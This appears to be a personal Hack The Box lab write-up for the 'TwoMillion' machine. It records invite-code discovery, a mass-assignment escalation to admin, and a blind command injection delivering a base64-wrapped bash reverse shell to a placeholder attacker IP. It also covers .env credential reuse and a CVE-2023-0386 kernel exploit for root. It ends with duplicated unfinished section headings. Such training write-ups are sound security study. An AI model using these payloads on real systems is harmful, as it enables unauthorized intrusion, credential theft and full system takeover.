# Hack The Box: TwoMillion

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux |
| **Status** | Retired |
| **Target IP** | 10.129.229.66 (per-session; was 10.129.153.208) |
| **Date** | 2026-11-19 |

> Working notes, written as I go. Approach: hypothesis first, then test.

---

## 1. Enumeration

### 1.1 Port scan

Two-pass approach (fast sweep, then deep scan on open ports — far quicker than `-sV -sC -p-` across all ports):

```bash
nmap -p- --min-rate 10000 -T4 10.129.153.208      # fast: find open ports
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

- Only **22 (SSH)** and **80 (HTTP, nginx)**. SSH is rarely the entry point on its own → the web server is the attack surface.
- Port 80 redirects to the hostname **`2million.htb`**, which public DNS can't resolve.

### 1.2 Virtual host — /etc/hosts

The site uses a name-based vhost, so the hostname must be mapped locally before it will load:

```bash
echo "10.129.153.208  2million.htb" | sudo tee -a /etc/hosts
ping -c1 2million.htb        # confirms it resolves
```

> Standard HTB pattern: when a box redirects to a `*.htb` hostname, add it to `/etc/hosts`. `/etc/hosts` is consulted before DNS.

### 1.3 Web application — http://2million.htb/

Recreation of the old Hack The Box website. Observations so far:

- A **login** page and (to investigate) a **registration** flow.
- Candidate recon still open: directory/vhost brute-forcing with `gobuster`/`ffuf`.
- Looking into how the site's own front-end features work (page source / JavaScript / the endpoints it calls).

_In progress._

## 2. Foothold

### 2.1 Registration is gated by an invite code

The API (`/api/v1/...`) requires authentication (`GET /api/v1` → `401 Unauthorized`), and registration needs an **invite code**. No code, no account.

Key detail about the API, found by testing: it reads parameters as **form-encoded** (`$_POST`), not JSON or query string. Sending `-d "code=x"` returns `"Invite code is invalid!"` (server parsed it); sending JSON returns `"Missing parameter: code"` (server ignored it).

### 2.2 Invite API discovered in the page's JavaScript

The invite page loads obfuscated JS (Dean Edwards packer — `eval(function(p,a,c,k,e,d){...})`). A beautifier only reindents it; to actually decode, run it with `eval` replaced by `console.log` (browser console or node), which reassembles the real strings:

```javascript
function verifyInviteCode(code){ ... url:'/api/v1/invite/verify' ... }
function makeInviteCode(){ ... type:"POST", url:'/api/v1/invite/how/to/generate' ... }
```

### 2.3 Generate-hint endpoint → ROT13

```bash
curl -i -s -X POST http://2million.htb/api/v1/invite/how/to/generate
```

Returns (200):

```json
{"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /api/v1/invite/generate","enctype":"ROT13"}, "hint":"Data is encrypted ... check the encryption type ..."}
```

The response names its own encoding: **ROT13**. Decoding the `data` field reveals the next step.

Decoding the ROT13 `data` pointed to `POST /api/v1/invite/generate`, which returned a **Base64** invite code:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate      # -> {"code":"<base64>","format":"encoded"}
echo '<base64>' | base64 -d                                     # -> FAZLT-XP2LQ-...  (invite code)
```

### 2.4 Register and authenticate

Registered with the code (the invite field was `readonly` client-side — removed in dev tools; **client-side controls are not security**), logged in, and grabbed the `PHPSESSID` session cookie.

### 2.5 Authenticated API route list

`GET /api/v1` with a valid session now returns the full route map:

```
user  GET   /api/v1/user/auth, /user/vpn/generate, /user/vpn/regenerate, /user/vpn/download
      POST  /user/register, /user/login
admin GET   /api/v1/admin/auth              (check if admin)
      POST  /api/v1/admin/vpn/generate      (generate VPN for a specific user)
      PUT   /api/v1/admin/settings/update   (update user settings)
```

Of interest: `admin/settings/update` (can a normal user escalate themselves to admin?) and `admin/vpn/generate` ("for a specific user" — sounds system-level).

### 2.6 Privilege escalation to admin (mass assignment)

`GET /api/v1/admin/auth` → `{"message":false}` (not admin). The update endpoint is fussy about method and format (breadcrumbs: `405` wrong method → `PUT`; "Invalid content type" → `Content-Type: application/json`; "Missing parameter: email"). Then it let me set a field I should never control:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=<session>" -H "Content-Type: application/json" \
  -d '{"email":"asdf@email.com","is_admin":1}'
# -> {"id":13,"username":"asdf","is_admin":1}
```

`GET /api/v1/admin/auth` now returns `{"message":true}`. This is a **mass-assignment / broken-access-control** flaw: a profile-update endpoint trusted a client-supplied `is_admin` field.

### 2.7 Command injection → reverse shell (foothold)

`POST /api/v1/admin/vpn/generate` takes a `username` and feeds it into a system command to build an OpenVPN config (the returned cert's Subject echoes the username). The input is **not sanitised** → command injection.

Output isn't reflected (blind), confirmed with a timing test:

```bash
time curl -s ... -d '{"username":"asdf; sleep 5"}'   # ~5s response = command ran
```

Exploited with a base64-wrapped bash reverse shell (base64 avoids breaking on shell/JSON metacharacters):

```bash
# listener: nc -lvnp 4444
echo -n 'bash -i >& /dev/tcp/<ATTACKER-VPN-IP>/4444 0>&1' | base64
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<session>" -H "Content-Type: application/json" \
  -d '{"username":"asdf; echo <base64> | base64 -d | bash"}'
```

Caught a shell as **`www-data`**. **Foothold.**

## 3. Privilege escalation

### 3.1 www-data → admin (credentials in .env)

The web app's database credentials sit in a hidden file in the web root:

```bash
cat /var/www/html/.env
# DB_HOST=127.0.0.1
# DB_DATABASE=htb_prod
# DB_USERNAME=admin
# DB_PASSWORD=<redacted>
```

`/var/www/html/VPN/user.cnf` is just the OpenSSL cert template (distractor). The real prize is `.env`. The DB password is **reused** by the system user `admin` (same pattern as Cap: creds found in one place, reused on a service):

```bash
ssh admin@2million.htb        # same password as DB_PASSWORD
cat ~/user.txt                # user flag
```

**User own complete.**

### 3.2 admin → root (CVE-2023-0386, OverlayFS)

Enumeration as `admin`: `sudo -l` gives nothing, but `/var/mail/admin` holds a message hinting at unpatched **2023 Linux kernel CVEs**, and the kernel is old:

```bash
uname -r      # 5.15.70-051570-generic (Sept 2022)
```

Chose **CVE-2023-0386** (OverlayFS) over the other 2023 candidates because:
- Its affected range (`< 6.2`) clearly covers 5.15.70.
- It's a **logic flaw**, not a use-after-free race — deterministic and repeatable, no risk of a kernel panic (unlike the io_uring / netfilter / perf UAF candidates).
- `searchsploit`'s only match (DirtyPipe, `5.8 < 5.16.11`) was a trap: CVE-2022-0847 was patched in 5.15.25, and this kernel is 5.15.70 — **newer than the fix, so not vulnerable**. Lesson: check the patch level, not just the version-range in the exploit title.

PoC: `xkaneiki/CVE-2023-0386`. The box has `gcc`/`make`/`git` (deliberate), and — crucially — the **FUSE 2 library that current Kali has dropped**, so it compiles on the box:

```bash
# on the box:
make all                         # warnings only; builds fuse, exp, gc
# terminal 1:
./fuse ./ovlcap/lower ./gc       # sets up the mount, blocks
# terminal 2 (second SSH session):
./exp                            # triggers copy-up -> root shell
id                               # uid=0(root)
cat /root/root.txt
```

**Root own complete. Box rooted.**

## 4. Lessons learned

- **Client-side controls aren't security.** The invite flow, the `readonly` field, the JS — all run on the client and can be read or bypassed. Never trust input shaped by the browser.
- **Enumerate APIs, read the front-end.** The whole foothold came from reading JavaScript and probing `/api/v1` methodically (form-encoding, methods, error messages as breadcrumbs).
- **Mass assignment / broken access control.** `settings/update` let a normal user set `is_admin`. Endpoints must whitelist which fields a user can change.
- **Unsanitised input into a system command = command injection.** `vpn/generate` fed `username` to a shell. Confirmed blind with a timing test; exploited with a base64-wrapped reverse shell.
- **Secrets in config files + password reuse.** DB creds in `.env`, reused by a system user — the same pattern as Cap.
- **Patch management is the root cause of privesc.** An outdated kernel (and a mail trail admitting it) handed over root. Check patch level, not just version range; prefer deterministic exploits over races.

## Appendix — attack chain in one line

JS-leaked invite API → ROT13/Base64 invite code → register → IDOR-free mass-assignment to admin → blind command injection (www-data shell) → DB creds in `.env` reused for SSH (user) → CVE-2023-0386 OverlayFS (root).

## 3. Privilege escalation

_TBD_

## 4. Lessons learned

_TBD_
